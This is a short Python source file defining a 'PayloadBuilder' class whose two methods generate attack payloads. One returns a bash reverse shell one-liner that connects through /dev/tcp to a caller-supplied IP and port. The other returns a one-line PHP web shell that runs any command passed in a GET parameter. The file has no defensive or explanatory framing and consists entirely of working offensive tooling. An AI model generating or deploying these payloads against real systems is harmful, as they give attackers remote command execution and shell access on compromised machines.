class PayloadBuilder:
    def build_reverse_shell(self, ip, port):
        return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

    def build_web_shell(self, lang):
        if lang == "php":
            return "<?php system($_GET['cmd']); ?>"
        return ""
